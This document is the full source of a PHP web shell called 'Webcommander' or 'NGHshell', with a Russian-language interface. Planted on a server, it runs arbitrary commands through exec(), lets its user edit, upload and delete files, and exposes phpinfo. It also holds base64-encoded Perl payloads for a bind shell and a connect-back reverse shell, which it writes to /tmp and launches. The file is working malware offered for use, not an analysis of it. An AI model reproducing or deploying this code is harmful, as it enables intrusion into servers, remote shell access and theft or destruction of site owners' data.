<?
/* Webcommander by Cr4sh_aka_RKL v0.3.9 NGH edition :p */

$script = $_SERVER["SCRIPT_NAME"];

/* username and pass here ***************/

$user = "yourlogin";
$pass = "yourpass";

/****************************************/

$login = @$_POST['login'];
$luser = @$_POST['user'];
$lpass = @$_POST['pass'];
$act = @$_GET['act'];

   $logo = "R0lGODlhMAAwAOYAAAAAAP////r6+jEvKzQ0NQICATc3HiAgGyoqJxsbGQ4ODXl5dPr68m1taoWFgj4+Pf39+vr6+Obm5Pj49/Ly"
          ."8ezs693d3MXFxJaWlV5dRtDOnquphqumcCcmGrezf8G9icnFlKCdet/br9jUqePgt+fkvOTj1X94PJKLUby7sk9JHF9ZKnJrPDk4"
          ."MEdAFD08NqqnmBUUEGxoVtnTukdFPV1cWGZlYezjxPXv2JCNgoN8ZuDcz3VvX/Dnz9vWx8fDt/jz5ZmWjrOwp/bz67mxnOrgyLu1"
          ."p9PNwfLt41BPTamoprGYabqrkK6gh+vcwu7izOLKpObSsujVtY6Cb+nXuerZveHFnbymheTNqubQrvf18ruedvDm2LW0s9DPz/v7"
          ."+7m5uQUFBQICAv///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
          ."AAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAGMALAAAAAAwADAAAAf/gGOCg4SFhoeIiYqLjI2OhFORUzqUOjyXlzKaMjU1SQ0L"
          ."j4tTXWCmp6inXV1KGA6doaKIU2ACtre4uBUSXmAODhhJsoe0uca4FLxKCxcYL8OFOrXH1BQWXjYSFw4E0IPF1NQVFUkC2tzeY9K2"
          ."BQhJDzEAAOEU5ebb3dDSCghdFBS7MDSQZ2tCriQVbJ17NkxHghwBLIDxYsFCBQtKbCAQYBBXEosCvmgLNgwAhi9dFjQgQOABKC9K"
          ."BhpLQjGhyGY2RHVBoK1Bgi5fbHUB4KBZv4MJEiB4kKQGKFCPDkx0ICZoLgBdXM3DpQ2MkiAOFtio8SCnozBeLgDoaCyGr623/ybw"
          ."AtMFRo6wSWg8ClMBDFxjBLxg+MtxwrULrILksNHikRgKSgjjomFhsDEtF70cSQEjyIIBjjFKvvVAgmVcE7RY23HkhxEYnx8hEB0O"
          ."wYTTBbVoQSJhh2bXU0A3WjEAYwEXyJMnt70AQIHcWoYgQWKC9Y8UOYQrWrHihALEBFaoGJ98PIHKCjrESB1dOnUfPlpnX9T9xAkW"
          ."MRSsYMG/f/8VBhzAnQoxtCcdF1zs4MMMM8y3HQonoMABBx+MMEIRSAQQABJFiDDCBx4sAeEKCLQ3HRIJ7sBgCI09iIIHI4ggYwk9"
          ."1GhCCSSMAMIHH3CAgg4svDDEEECciGARDDbRYv8iK6CwxAdMpNBDCSWMEMIGGmgAAggbyJBBBiiEoEMGJqTwg3s7CGGEEzMouYgN"
          ."OnAQQgEAENHDDTAU0IKFI2Qgz58d/JgCAA8AYagRALxQRBVNMJSIDQ4QAYM8B9yAAxEAtEACCX4moIOYChTwQgiDPkAkEIgqWgUT"
          ."einSQA4/RAaAGAswUCoSRwCgwBEKzhBCDDRsUOqpqfbgBKuLvPqDELrOasGtQQBQww7UMpjlB4MOkMK2OSRqLLKuwhrZAzUQOmxz"
          ."C5hgAgyZyKDBoH/++cKd4CaiLLMPVKCAtIQOga66AxUg8LsAHLDAweXOe0O9iDTgQArjBjCYPKYyi4D/uj/AsIE8IJRqKKreLtzq"
          ."ow+PCwEDD1A8XQLSUkvCxgB4MOgLQOCAQ6o3VHHFyIjYsAArhEaghVqESlDmvgm0wDIAHYSQqs2XZuqEzjwf4rMQSrg0wT8OvGCD"
          ."CRbskEIS+ybKAwc6/OB1jU8Y0YIMVUhxhaOIsHACByD0wMANOHqY5Y48guiBnChkwPYNTkxdBRVRZLHFkojY96IIDPQ9wt+CDz4h"
          ."hCy0UEQRiS9OhRSNY/E4I+O9yAAJfgPugeaEs4BAB6BPPTrpWWABBRRbaLdIgAjM3sHwBxA//PG0g764FLjnvrsVS/jOSBJdDOke"
          ."igj28MTnyi8fRem7Q2EFc/TSL5KEEdcjyIX2T2wfOhWjl667+OOTL0oSQpyIPRftu2874/J7Xv3s9wj8TUd9/Gtf7USHOyzMb4Dj"
          ."i9791GQEIliQCEzIYAavwMErbOGDIFzCFpZAwhKWTxEdGIAKV8jCFrrwhStMhwxnSMMa2tAQgQAAOw==";
/* bd.pl ********************************/
   $bind = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMSVNU"
          ."RU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMs"
          ."JlBGX0lORVQsJlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0"
          ."KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkp"
          ."KSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbGlzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hp"
          ."bGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspKQ0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZp"
          ."bmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4iOw0Kb3BlbiBTVERFUlIsIj4mQ09O"
          ."TiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3NlIENPTk47DQpl"
          ."eGl0IDA7DQp9DQp9";
/* connectback-backdoor on perl ********/
   $backcon = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"
          ."aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1p"
          ."bmV0X2F0b24oJHRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIp"
          ."IHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9J"
          ."TkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8"
          ."fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsN"
          ."Cm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7"
          ."DQpjbG9zZShTVERFUlIpOw==";

if ($act == "showlogo") {
 header("Content-type: image/gif");
 echo base64_decode($logo);
 exit;
}
if ($login) {
 Sleep(1);
 if ($luser == $user && $lpass == $pass) {
  setcookie("logined", $pass);
 } else {
  die("<font color=#DF0000>Login error</font>");
 }
} else {
 $logined = @$_COOKIE['logined'];
 if ($logined != $pass) {
?>
 <form action=<?=$script?> method=POST>
 user: <input type=text name=user><br>
 pass: <input type=password name=pass><br><br>
 <input type=submit name=login value=login>
 </form>
<?
  exit;
 }
}
?>
 <html>
 <head>
 <style type="text/css"><!--
 body {background-color: #cccccc; color: #000000; FONT-SIZE: 10pt}
 body, td, th, h1, h2 {font-family: Verdana;}
 pre {margin: 0px; font-family: monospace;}
 a:link {color: #000099; text-decoration: none;}
 a:visited {color: #000099; text-decoration: none;}
 a:hover {text-decoration: underline;}
 table {border-collapse: collapse;}
 td, th { border: 1px solid #000000; font-size: 75%; vertical-align: baseline;}
 .e {background-color: #ccccff; font-weight: bold; color: #000000;}
 .h {background-color: #9999cc; font-weight: bold; color: #000000;}
 .v {background-color: #cccccc; color: #000000;}
 .v2 {background-color: #dfdfdf; color: #000000;}
 .v3 {background-color: #FEB4BB; color: #000000;}
 i {color: #666666; background-color: #cccccc;}
 img {float: right; border: 0px;}
 hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #000000;}
 input, textarea {FONT-SIZE: 8pt; border: 1px solid #222222; color: #222222; background-color: #dfdfdf; }
 //--></style>
 <title>Webcommander at <?=$_SERVER["HTTP_HOST"]?></title>
 </head>
 <body>
<?
$path = @rawurldecode($_GET['dir']);
$cmd = @$_GET['cmd'];
if ($act == "mass") {
 $post = array_keys($_POST);
 $todo = $_POST[$post[sizeof($post)-2]];
 $to = $_POST[$post[sizeof($post)-1]];
 for ($i = 0; $i < sizeof($post)-2; $i++) {
  if ($_POST[$post[$i]]) {
   if ($todo == "del") {
    rm($_POST[$post[$i]]);
   }
   elseif ($todo == "mv") {
    mvcp($_POST[$post[$i]], $to."/".$post[$i], $todo);
   }
   else {
    mvcp($_POST[$post[$i]], $to."/".$post[$i], "cp");
   }
  }
 }
 //exit;
}
elseif ($act == mkdir) {
 $dirname = @$_POST['dirname'];
 $path = @$_POST['dir'];
 if (!$dirname) die("<font color=#DF0000>Ведите имя</font>\n");
 if (!@mkdir($path.$dirname)) die("<font color=#DF0000>Немогу создать папку</font>\n");
}
elseif ($act == upload) {
 $userfile = @$_FILES['userfile']['tmp_name'];
 $uploaddir = @$_POST['uploaddir'];
 if (is_uploaded_file($userfile))  {
  @copy($userfile, $uploaddir.$_FILES['userfile']['name']);
  @unlink($userfile);
  $path = $uploaddir;
 } else die("<font color=#DF0000>Ошибка при загрузке файла</font>\n");
}
elseif ($act == "rm") {
 $name = @$_GET['name'];
 rm($name);
 $inf = pathinfo($name);
 $path = $inf['dirname'];
}
elseif ($act == "viev") {
 $name = @$_GET['name'];
 if (file_exists($name)) {
  echo "<form action=".$script."?act=updatefile method=POST>\n".
       "файл <b>".$name."</b><br>\n";
  $out = implode("", file($name));
  echo "<textarea rows=25 cols=70 name=text>";
  print_r ($out);
  echo "</textarea><br>\n".
       "<input type=hidden name=file value=\"".$name."\">\n".
       "<input type=submit value=сохранить>\n".
       "</form>\n".
       "[ <a href=javascript:history.go(-1)>back</a> ]";
 } else die("<font color=#DF0000>Файл не найден</font>\n");
 exit;
}
elseif ($act == "updatefile") {
 $filename = @$_POST['file'];
 $text = @$_POST['text'];
 if (is_writable($filename)) {
  $handle = fopen($filename, "w+");
  if (fwrite($handle, stripslashes($text)) === FALSE) {
   die("<font color=#DF0000>Ошибка записи в файл</font>\n");
  }
 } else die("<font color=#DF0000>Файл недоступен для записи</font>\n");
 fclose($handle);
 $inf = pathinfo($filename);
 $path = $inf['dirname'];
}
elseif ($act == "touch") {
 $userfile = @$_POST['file'];
 $userdir = @$_POST['dir'];
 if (!$userfile) {
  die("<font color=#DF0000>Ведите имя</font>\n");
 }
 $handle = fopen($userdir.$userfile, "w+");
 if (fwrite($handle, "") === FALSE)  {
   die("<font color=#DF0000>Ошибка создания файла</font>\n");
 }
 fclose($handle);
 $path = $userdir;
}
elseif ($act == "renameform") {
 $name = @$_GET['name'];
 echo "<form action=".$script."?act=rename method=POST>"
     ."<b>Переименовать, копировать или переместить </b>".$name."<br>"
     ."<input type=text name=to size=40 value=".$name.">"
     ."<input type=hidden name=from value=".$name."><br>"
     ."<input type=radio name=todo value=mv checked> переместить<br>"
     ."<input type=radio name=todo value=cp> скопировать<br>"
     ."<input type=submit value=Go></form>"
     ."[ <a href=javascript:history.go(-1)>back</a> ]";
 exit;
}
elseif ($act == "rename") {
 $from = @$_POST['from'];
 $to = @$_POST['to'];
 $todo = @$_POST['todo'];
 mvcp($from, $to, $todo);
 $inf = pathinfo($from);
 $path = $inf['dirname'];
}
elseif ($act == "bindshell") {
 $port = @$_POST['port'];
 if (!$port) {
  die("<font color=#DF0000>Укажите порт</font>");
 }
 $file = "/tmp/bd";
 $handle = fopen($file, "w+");
 if (fputs($handle, base64_decode($bind)) === FALSE)  {
   die("<font color=#DF0000>Ошибка создания файла ".$file."</font>\n");
 } else {
  fclose($handle);
  passthru("perl ".$file." ".$port." > /dev/null &");
 }
}
elseif ($act == "backconnect") {
 $port = @$_POST['port'];
 $addr = @$_POST['addr'];
 if (!$port || !$addr) {
  die("<font color=#DF0000>Укажите порт и адресс</font>");
 }
 $file = "/tmp/bcon";
 $handle = fopen($file, "w+");
 if (fputs($handle, base64_decode($backcon)) === FALSE)  {
   die("<font color=#DF0000>Ошибка создания файла  ".$file."</font>\n");
 } else {
  fclose($handle);
  passthru("perl ".$file." ".$addr." ".$port." > /dev/null &");
 }
}
elseif ($act == "phpinfo") {
 phpinfo();
 exit;
}
if (!$path) {
 $dir = getcwd()."/";
} else {
 $dir = stripslashes($path);
 if ($dir[strlen($dir)-1] != "/") $dir .= "/";
}
$dir = str_replace("\\", "/", $dir);
$dir = str_replace("//", "/", $dir);
$arr = explode("/", $dir);
for ($i=0; $i<count($arr)-2; $i++) {
 $back .= $arr[$i]."/";
}
?>
 <table class=e>
  <tr>
   <td rowspan=3><img src=<?=$script?>?act=showlogo></td>
   <td><b>Host:</b></td><td class=v><?=$_SERVER["HTTP_HOST"]?></td>
  </tr>
  <tr>
   <td><b>IP address:</b></td><td class=v><?=$_SERVER["SERVER_ADDR"]?></td>
  </tr>
  <tr>
   <td><b>Software:</b></td><td class=v><?=$_SERVER["SERVER_SOFTWARE"]?></td>
  </tr>
 </table>
 <form action=<?=$script?> method=GET>
 <b>Команда:</b> <input type=text name=cmd value="<?=$cmd?>" size=120>
 <input type=hidden name=dir value="<?=$dir?>"><br>
 <textarea rows=8 cols=97>
<?
if ($cmd) {
 exec($cmd, $out);
 echo convert_cyr_string(implode("\r\n", $out), "a", "w");
}
?>
</textarea></form>
<form action=<?=$script?>?act=bindshell method=POST>
<b>Bind /bin/bash at port: </b><input type=text name=port size=8>
<input type=submit value=Bind>
</form>
<form action=<?=$script?>?act=backconnect method=POST>
<b>Connectback:</b> Адресс <input type=text name=addr>
Порт <input type=text name=port size=8>
<input type=submit value=Connect>
</form>
<?
if($handle = @opendir($dir)) {
?>
 <form action=<?=$script?>?act=mass method=POST>
 <table width=700>
 <tr class=e><td colspan=7><b><?=$dir?></b></td></tr>
 <tr class=h><td><a href="<?=$script?>?dir=<?=$back?>"><<</a></td>
 <td><small><font color=#D1D1E1>size</font></small></td>
 <td><small><font color=#D1D1E1>date</font></small></td>
 <td colspan=4><small><font color=#D1D1E1>permissions</font></small></td></tr>
<?
 $cssclass = "v";
 while ($file = readdir($handle)) {
  if (is_dir($dir.$file) && $file != ".." && $file != ".") {
   $inf = pathinfo($dir.$file);
   echo "<tr class=".$cssclass." onmouseover=\"className='v3'\"  onmouseout=\"className='".$cssclass."'\">\n"
       ."<td><input type=checkbox name=".$file." value=".$dir.$file.">"
       ."[<a href=\"".$script."?dir=".rawurlencode($inf['dirname'])."/".rawurlencode($inf['basename'])."\">"
       .$file."</a>]</td><td><b>--dir</b></td><td>".date("d.m.y/H:i", filemtime($dir.$file))."</td>\n"
       ."<td>".parseperms(fileperms($dir.$file))."</td>\n"
       ."<td><a href=\"".$script."?act=rm&name=".rawurlencode($dir.$file)."\">DEL</a></td>\n"
       ."<td colspan=2><a href=\"".$script."?act=renameform&name=".rawurlencode($dir.$file)."\">MOVE(COPY)</a></td></tr>\n";
   if ($cssclass == "v") $cssclass = "v2";
   elseif ($cssclass == "v2") $cssclass = "v";
  }
 }
 rewinddir($handle);
 while ($file = readdir($handle)) {
  if (is_file($dir.$file)) {
   echo "<tr class=".$cssclass." onmouseover=\"className='v3'\"  onmouseout=\"className='".$cssclass."'\">\n"
       ."<td><input type=checkbox name=".$file." value=".$dir.$file.">"
       ."[".$file."]</td><td>".filesize($dir.$file)."</td><td>\n"
       .date("d.m.y/H:i", filemtime($dir.$file))."</td>\n"
       ."<td>".parseperms(fileperms($dir.$file))."</td>\n"
       ."<td><a href=\"".$script."?act=rm&name=".rawurlencode($dir.$file)."\">DEL</a></td>\n"
       ."<td><a href=\"".$script."?act=renameform&name=".rawurlencode($dir.$file)."\">MOVE(COPY)</a></td>\n"
       ."<td><a href=\"".$script."?act=viev&name=".rawurlencode($dir.$file)."\">EDIT</a></td></tr>\n";
   if ($cssclass == "v") $cssclass = "v2";
   elseif ($cssclass == "v2") $cssclass = "v";
  }
 }
 closedir($handle);
?>
 </table>
 <b>С отмечеными:</b> <input type=radio name=mass value=del checked> Удалить
 <b>[</b> <input type=radio name=mass value=mv> Переместить
 <input type=radio name=mass value=cp> Копировать
 в <input type=text name=to value="<?=$dir?>"> <b>]</b>
 <br><input type=submit value=Выполнить>
 </form>
 <form action=<?=$script?>?act=mkdir method=POST>
 <b>Создать папку</b><br>
 <input type=text name=dirname size=40>
 <input type=hidden name=dir value="<?=$dir?>">
 <input type=submit value=Создать></form>
 <FORM ENCTYPE=multipart/form-data ACTION=<?=$script?>?act=touch METHOD=POST>
 <b>Создать пустой файл</b><br>
 <INPUT type=text NAME=file size=40>
 <input type=hidden name=dir value="<?=$dir?>">
 <INPUT TYPE=submit VALUE=Создать></FORM>
 <FORM ENCTYPE=multipart/form-data ACTION=<?=$script?>?act=upload METHOD=POST>
 <b>Закачать файл</b><br>
 <INPUT NAME=userfile TYPE=file size=40>
 <input type=hidden name=uploaddir value="<?=$dir?>">
 <INPUT TYPE=submit VALUE=Отправить></FORM>
 <a href=<?=$script?>?act=phpinfo>Phpinfo()</a>
<?
} else die("<font color=#DF0000>Директория не найдена</font>\n");
function rm($name) {
 if (is_file($name)) {
  if (!@unlink($name)) die("<font color=#DF0000>Немогу удалить файл <b>".$name."</b></font>\n");
 }
 elseif (is_dir($name)) deldir($name);
}
function mvcp($from, $to, $todo) {
 if ($todo == "mv") {
  if (is_file($from)) {
   if (!rename($from, $to)) {
    die("<font color=#DF0000>Ошибка при перемещении файла ".$from."</font>");
   }
  }
  elseif (is_dir($from)) {
   mvdir($from, $to, $todo);
  }
 } else {
  if (is_file($from)) {
   if (!copy($from, $to)) {
    die("<font color=#DF0000>Ошибка при копировании файла ".$from."</font>");
   }
  }
  elseif (is_dir($from)) {
   mvdir($from, $to, "cp");
  }
 }
}
function deldir($name) {
 if (@$handle=opendir($name)) {
  while ($file = readdir($handle)) {
   if ($file != ".." && $file != ".") {
    if (is_file($name."/".$file)) {
     unlink($name."/".$file);
    }
    elseif (is_dir($name."/".$file)) {
     deldir($name."/".$file);
    }
   }
  }
  closedir($handle);
 } else die("<font color=#DF0000>Немогу удалить папку <b>".$name."</b></font>\n");
 rmdir($name);
}
function mvdir($from, $to, $todo) {
 if (@$handle = opendir($from)) {
  mkdir($to);
  while ($file = readdir($handle)) {
   if ($file != ".." && $file != ".") {
    if (is_file($from."/".$file)) {
     if (!copy($from."/".$file, $to."/".$file)) {
      die("<font color=#DF0000>Ошибка при копировании файла ".$from."/".$file."</font>");
     }
    }
    elseif (is_dir($from."/".$file)) {
     mvdir($from."/".$file, $to."/".$file, $todo);
    }
   }
  }
  closedir($handle);
  if ($todo == "mv") deldir($from);
 } else die("<font color=#DF0000>Немогу копировать папку <b>".$name."</b></font>\n");
}
function parseperms($perms)
{
 if (!$perms) return "null";
 if (($perms & 0xC000) == 0xC000) {
    $info = 'socket ';
 } elseif (($perms & 0xA000) == 0xA000) {
    $info = 'link ';
 } elseif (($perms & 0x8000) == 0x8000) {
    $info = '-';
 } elseif (($perms & 0x6000) == 0x6000) {
    $info = 'b';
 } elseif (($perms & 0x4000) == 0x4000) {
    $info = 'dir ' ;
 } elseif (($perms & 0x2000) == 0x2000) {
    $info = 'c';
 } elseif (($perms & 0x1000) == 0x1000) {
    $info = 'p';
 } else {
    $info = 'u';
 }
 $info .= (($perms & 0x0100) ? 'r' : '-');
 $info .= (($perms & 0x0080) ? 'w' : '-');
 $info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));
 $info .= (($perms & 0x0020) ? 'r' : '-');
 $info .= (($perms & 0x0010) ? 'w' : '-');
 $info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));
 $info .= (($perms & 0x0004) ? 'r' : '-');
 $info .= (($perms & 0x0002) ? 'w' : '-');
 $info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));
 return $info;
}
echo "<br><small>NGHshell 0.3.9 by Cr4sh</body></html>\n";

/* EOF **********************************/
?>
